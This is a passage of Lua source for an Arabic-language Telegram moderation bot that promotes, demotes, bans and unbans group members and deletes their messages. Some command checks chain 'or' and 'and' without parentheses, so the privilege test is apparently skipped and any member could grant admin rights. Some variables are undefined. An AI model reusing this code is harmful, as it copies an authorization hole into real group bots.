Dev_Abs(msg.chat_id_, msg.id_, 1, "🎗 ⌯ ٱڵـمسخدم ⌯» ◝ ["..absc9.."] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ "..result.id_.." ◟\n📣 ⌯ تـۖم تنزيڵه من ⌯» ⤈\n⌯ ( "..sudo3..''..onall..''..moall..''..vpall..''..monsh..''..monsh2..''..owner..''..momod..''..vipmem.." ) ⌯ \n🚸 ⌯ رتبته ٱلٱن { عضو فقط } \n ", 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, "🎗 ⌯ ٱڵـعضو ⌯» ◝ ["..absc9.."] ◟ \n🚸 ⌯ ڵم تتم ترقيته مسبقٱ \n ", 1, 'md')
end 
if masco(msg.sender_user_id_,msg.chat_id_) == 'botow' then
DevAbs:srem(loolIQ..'abs:sudo3:', result.id_)
DevAbs:srem(loolIQ..'abs:ownerall:', result.id_)
DevAbs:srem(loolIQ..'abs:adminall:', result.id_)
DevAbs:srem(loolIQ..'abs:vipall:', result.id_)
DevAbs:srem(loolIQ..'abs:monsh:'..msg.chat_id_,result.id_)
DevAbs:srem(loolIQ..'abs:monshid:'..msg.chat_id_,result.id_)
DevAbs:srem(loolIQ..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_, result.id_)
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_, result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'sudo3' then
DevAbs:srem(loolIQ..'abs:ownerall:', result.id_)
DevAbs:srem(loolIQ..'abs:adminall:', result.id_)
DevAbs:srem(loolIQ..'abs:vipall:', result.id_)
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_, result.id_)
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_, result.id_)
DevAbs:srem(loolIQ..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:srem(loolIQ..'abs:monshid:'..msg.chat_id_,result.id_)
DevAbs:srem(loolIQ..'abs:monsh:'..msg.chat_id_,result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_, result.id_)
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_, result.id_)
DevAbs:srem(loolIQ..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:srem(loolIQ..'abs:monshid:'..msg.chat_id_,result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monsh2' then
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_, result.id_)
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_, result.id_)
DevAbs:srem(loolIQ..'abs:owners:'..msg.chat_id_, result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'owner' then
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_, result.id_)
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_, result.id_)
end
Fsend = '❗️📛 ⌯ ٱڵمعرف غير صحيح*'
Dev_Abs(msg.chat_id_, msg.id_, 1, Fsend, 1, 'md')
end
end
resolve_username(rem[2],remm)
end 
--     Source loolIQ     --
if text:match("^رفع ادمن بالكروب$") or text:match("^رفع ادمن الكروب$")  and is_monshid(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯  تـۖم رفعه ٱدمن فيۧ ٱڵكروب \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل ادمن بالكروب$") or text:match("^تنزيل ادمن الكروب$")  and is_monshid(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱدمن ٱڵكروب ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم تنزيڵه ٱدمن من ٱڵكروب \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text:match("^رفع بكل الصلاحيات$") or text:match("^رفع بكل صلاحيات$")  and is_monshid(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم رفعه ٱدمن فيۧ جميع ٱڵصلٱحيٱت \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n❗️🎒 ⌯ صلٱحيٱتة ٱلٱن : \n❗️🧩 ⌯ ٱڵدعوة بٱڵرٱبط \n❗️📛 ⌯ حـذف ٱڵرسٱئڵ \n❗️💎 ⌯ تثبيت ٱڵرسٱئڵ \n❗️🏵 ⌯ ٱضٱفة مشرفين \n❗️🏮 ⌯ تغيير ٱسـم ٱڵـمجموعة \n ', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه تغيير الاسم$")  and is_monshid(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم ٱڵغٱء خٱصية تغيير ٱلٱسـم \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n❗️🎒 ⌯ صلٱحيٱتة ٱلٱن : \n❗️🧩 ⌯ ٱڵدعوة بٱڵرٱبط \n❗️📛 ⌯ حـذف ٱڵرسٱئڵ \n❗️💎 ⌯ تثبيت ٱڵرسٱئڵ \n ', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه التثبيت$")  and is_monshid(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=false&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم ٱڵغٱء خٱصية ٱڵـتثبيت \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n❗️🎒 ⌯ صلٱحيٱتة ٱلٱن : \n❗️🧩 ⌯ ٱڵدعوة بٱڵرٱبط \n❗️📛 ⌯ حـذف ٱڵرسٱئڵ \n ', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Dd]el$") or text:match("^حذف$") and msg.reply_to_message_id_ ~= 0 then
local id = msg.id_
local msgs = {[0] = id}
delete_msg(msg.chat_id_,{[0] = msg.reply_to_message_id_})
delete_msg(msg.chat_id_,msgs)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم حـذف ٱڵرسٱڵة مع رسٱڵة ٱلٱمـر ', 1, 'md')
end
if is_monshid(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تفعيل الحظر$") or text:match("^تفعيل الطرد$") then
DevAbs:del("ABS_PROX:lock:ban"..bot_id..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـفعيـۧڵ ٱڵـطرد وٱڵـحظر\n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ \n ', 1, 'md')
end
if text:match("^تعطيل الحظر$") or text:match("^تعطيل الطرد$") and is_monshid(msg.sender_user_id_, msg.chat_id_) then
DevAbs:set("ABS_PROX:lock:ban"..bot_id..msg.chat_id_,"ABS_PROX")
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـعطيـۧڵ ٱڵـطرد وٱڵـحظر\n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ \n ', 1, 'md')
end
end
--     Source loolIQ     --
if text:match("^حظر$") and msg.reply_to_message_id_ ~= 0 then
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ لٱ تستطيع ٱڵـطرد ٱو ٱڵـحظر \n❗️⚠️ ⌯ لٱنة معطل من قبل ٱڵمنشئ ', 1, 'md')
return "ABS_PROX"
end
function ban_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:banned:'..msg.chat_id_
if not is_admin(result.sender_user_id_, result.chat_id_) then
if DevAbs:sismember(loolIQ..abs, result.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..result.sender_user_id_..' )\n❗️🏌🏻‍♂️ ⌯ is already banned \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ هوَ بٱڵفعڵ محظور في ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
chat_kick(result.chat_id_, result.sender_user_id_)
else
DevAbs:sadd(loolIQ..abs, result.sender_user_id_)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..result.sender_user_id_..' )\n❗️🏌🏻‍♂️ ⌯ has been banned \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم حظرة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ban_by_reply)
end  
--     Source loolIQ     --
if text:match('^حظر @(.*)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
local ap = {string.match(text, '^(حظر) @(.*)$')}
function ban_by_username(extra, result, success)
local abs = 'bot:banned:'..msg.chat_id_
if result.id_ then 
if is_admin(result.id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️⚠️ ⌯ لٱ تستطيع حظر ( ['..absc9..'] )\n❗️🚸 ⌯ لٱنه يمتڵك ٱحدى ٱڵـرتب : \n{ مميز • ادمن • مدير • منشئ • مطور } ', 1, 'md')
else
if DevAbs:sismember(loolIQ..abs, result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.id_..' ◟\n📣 ⌯ هوَ بٱڵفعڵ محظور في ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
else
DevAbs:sadd(loolIQ..abs, result.id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.id_..' ◟\n📣 ⌯ تـۖم حظرة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
chat_kick(msg.chat_id_, result.id_)
end
end
end
end
resolve_username(ap[2],ban_by_username)
end
--     Source loolIQ     --
if text:match("^[Bb]an (%d+)$") then
local ap = {string.match(text, "^([Bb]an) (%d+)$")}
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ لٱ تستطيع ٱڵـطرد ٱو ٱڵـحظر \n❗️⚠️ ⌯ لٱنة معطل من قبل ٱڵمنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if not is_admin(ap[2], msg.chat_id_) then
DevAbs:sadd(loolIQ..'bot:banned:'..msg.chat_id_, ap[2])
chat_kick(msg.chat_id_, ap[2])
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..ap[2]..' )\n❗️🏌🏻‍♂️ ⌯ has been banned \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..ap[2]..' ◟\n📣 ⌯ تـۖم حظرة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
end
end
--     Source loolIQ     --
local text = msg.content_.text_:gsub('حذف الكل','Delall')
if text:match("^[Dd]elall$") and msg.reply_to_message_id_ ~= 0 then
function delall_by_reply(extra, result, success)
del_all_msgs(result.chat_id_, result.sender_user_id_)
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,delall_by_reply)
end
if text:match("^[Dd]elall (%d+)$") then
local ass = {string.match(text, "^([Dd]elall) (%d+)$")}
if not ass then
return false
else
del_all_msgs(msg.chat_id_, ass[2])
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ All messages from User : ( '..ass[2]..' ) \n❗️📛 ⌯ has been deleted ', 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ رسٱئڵ ٱڵـعضو : ( '..ass[2]..' )\n❗️📛 ⌯ تـۖم حذفهٱ جميعٱ ', 1, 'html')
end
end
end
--     Source loolIQ     --
if text:match("^[Dd]elall @(.*)$") then
local ap = {string.match(text, "^([Dd]elall) @(.*)$")}
function delall_by_username(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
if result.id_ then
del_all_msgs(msg.chat_id_, result.id_)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '*❗️🚸 ⌯ All messages from User : ( '..result.id_..' )\n❗️🏌🏻‍♂️ ⌯ has been deleted \n '
else
text = '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.id_..' ◟\n📣 ⌯ تـۖم حـذف كڵ رسٱڵة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n '
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '*❗️📛 ⌯ Username is not correct *'
else
text = '*❗️📛 ⌯ ٱڵمعرف غير صحيح*'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],delall_by_username)
end
--     Source loolIQ     --
local text = msg.content_.text_:gsub('الغاء حظر','Unban')
if text:match("^[Uu]nban$") and msg.reply_to_message_id_ ~= 0 then
function ABS_PROX(extra, result, success)
function unban_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:banned:'..msg.chat_id_
if not DevAbs:sismember(loolIQ..abs, result.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..result.sender_user_id_..' )\n❗️🏌🏻‍♂️ ⌯ is not banned \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ هوَ ڵيس محظور ڵيتم حظرة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
else
DevAbs:srem(loolIQ..abs, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..result.sender_user_id_..' )\n❗️🏌🏻‍♂️ ⌯ has been unbanned \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـمحظور ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم ٱڵغٱء حظرة من ٱڵـمجموعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unban_by_reply)
end
channel_get_kicked(msg.chat_id_,ABS_PROX)
end
--     Source loolIQ     --
if text:match("^[Uu]nban @(.*)$") then
local ap = {string.match(text, "^([Uu]nban) @(.*)$")}
function unban_by_username(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
if result.id_ then
if not DevAbs:sismember(loolIQ..'bot:banned:'..msg.chat_id_, result.id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..result.id_..' )\n❗️🏌🏻‍♂️ ⌯ is not banned \n ', 1, 'md')
else
text = '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.id_..' ◟\n📣 ⌯ هوَ ڵيس محظور ڵيتم حظرة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n '
end
else
DevAbs:srem(loolIQ..'bot:banned:'..msg.chat_id_, result.id_)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '*❗️🚸 ⌯ The User : ( '..result.id_..' )\n❗️🏌🏻‍♂️ ⌯ has been unbanned \n '
else
text = '🎗 ⌯ ٱڵـمحظور ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.id_..' ◟\n📣 ⌯ تـۖم ٱڵغٱء حظرة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n '
end
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '*❗️📛 ⌯ Username is not correct *'
else
text = '*❗️📛 ⌯ ٱڵمعرف غير صحيح*'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],unban_by_username)
end
--     Source loolIQ     --
if text:match("^[Uu]nban (%d+)$") then
local ap = {string.match(text, "^([Uu]nban) (%d+)$")}
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if not DevAbs:sismember(loolIQ..'bot:banned:'..msg.chat_id_, ap[2]) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..ap[2]..' )\n❗️🏌🏻‍♂️ ⌯ has been unbanned \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..ap[2]..' ◟\n📣 ⌯ هوَ ڵيس محظور ڵيتم حظرة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
else
DevAbs:srem(loolIQ..'bot:banned:'..msg.chat_id_, ap[2])
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..ap[2]..' )\n❗️🏌🏻‍♂️ ⌯ has been unbanned \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـمحظور ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..ap[2]..' ◟\n📣 ⌯ تـۖم ٱڵغٱء حظرة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
end
end
--     Source loolIQ     --
local text = msg.content_.text_:gsub('حظر عام','Banall')
if text:match("^[Bb]anall$") and is_sudo(msg) and msg.reply_to_message_id_ then
function gban_by_reply(extra, result, success)
local gps = DevAbs:scard(loolIQ.."bot:groups")
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:gban:'
DevAbs:sadd(loolIQ..abs, result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..result.sender_user_id_..' )\n❗️🏌🏻‍♂️ ⌯ has been globaly banned \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم حظرة من ( '..gps..' ) مجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
end
--     Source loolIQ     --
if text:match("^[Bb]anall @(.*)$") and is_sudo(msg) then
local aps = {string.match(text, "^([Bb]anall) @(.*)$")}
function gban_by_username(extra, result, success)
local gps = DevAbs:scard(loolIQ.."bot:groups")
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:gban:'
if result.id_ then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '*❗️🚸 ⌯ The User : ( '..result.id_..' )\n❗️🏌🏻‍♂️ ⌯ has been globaly banned \n '
else
text = '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.id_..' ◟\n📣 ⌯ تـۖم حظرة من ( '..gps..' ) مجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n '
end
DevAbs:sadd(loolIQ..abs, result.id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '*❗️📛 ⌯ Username is not correct *'
else
text = '*❗️📛 ⌯ ٱڵمعرف غير صحيح*'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(aps[2],gban_by_username)
end
--     Source loolIQ     --
if text:match("^[Bb]anall (%d+)$") and is_sudo(msg) then
local ap = {string.match(text, "^([Bb]anall) (%d+)$")}
local gps = DevAbs:scard(loolIQ.."bot:groups")
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
local abs = 'bot:gban:'
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..ap[2]..' )\n❗️🏌🏻‍♂️ ⌯ has been globaly banned \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..ap[2]..' ◟\n📣 ⌯ تـۖم حظرة من ( '..gps..' ) مجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
DevAbs:set(loolIQ..'bot:gban:'..ap[2],true)
DevAbs:sadd(loolIQ..abs, ap[2])
end
--     Source loolIQ     --
local text = msg.content_.text_:gsub('الغاء العام','unbanall')
if text:match("^[Uu]nbanall$") and is_sudo(msg) and msg.reply_to_message_id_ then
function ungban_by_reply(extra, result, success)
local gps = DevAbs:scard(loolIQ.."bot:groups")
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:gban:'
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..result.sender_user_id_..' )\n❗️🏌🏻‍♂️ ⌯ has been unbanned (Gban) \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم ٱڵغٱء حظرة من ( '..gps..' ) مجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
DevAbs:srem(loolIQ..abs, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
end
--     Source loolIQ     --
if text:match("^[Uu]nbanall @(.*)$") and is_sudo(msg) then
local apid = {string.match(text, "^([Uu]nbanall) @(.*)$")}
function ungban_by_username(extra, result, success)
local gps = DevAbs:scard(loolIQ.."bot:groups")
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:gban:'
if result.id_ then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '*❗️🚸 ⌯ The User : ( '..result.id_..' )\n❗️🏌🏻‍♂️ ⌯ has been unbanned (Gban) \n '
else
